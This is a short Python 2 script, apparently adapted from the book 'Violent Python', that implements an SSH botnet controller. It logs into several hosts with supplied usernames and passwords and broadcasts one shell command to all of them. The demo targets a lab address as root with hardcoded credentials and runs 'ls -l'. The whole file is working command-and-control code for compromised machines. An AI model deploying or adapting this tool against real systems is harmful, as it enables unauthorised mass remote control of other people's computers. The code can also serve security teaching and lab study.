##########################################################
#
# SSH botnet controller program from "Violent Python"
# No brute force pwd cracker. Must already have user/pwd
#
##########################################################

import optparse
import pxssh


class Client:
    
    def __init__(self,host,user,password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()
        
    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host,self.user,self.password)
            print '[+] SSH session established!! ' + self.host
            return s
        except Exception, e:
            print e
            print '[-] Error Connecting (FUCK!!!) ' + self.host
            
    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before
        


def add_client(host,user,password):
    client = Client(host,user,password)
    botnet.append(client)
    
def control_cmd(command):
    for client in botnet:
        output = client.send_command(command)
        print '[+] Sending commands to ' + client.host
        print '[*] ' + str(output)
        print '================================================'
        
    
botnet = [] # Array that stores the CLient class instances



def main():
    add_client('10.211.55.3','root','poop')
    #add_client('10.211.55.4','root','toor')
    control_cmd('ls -l')



if __name__ == '__main__':
    main()


    
    
    
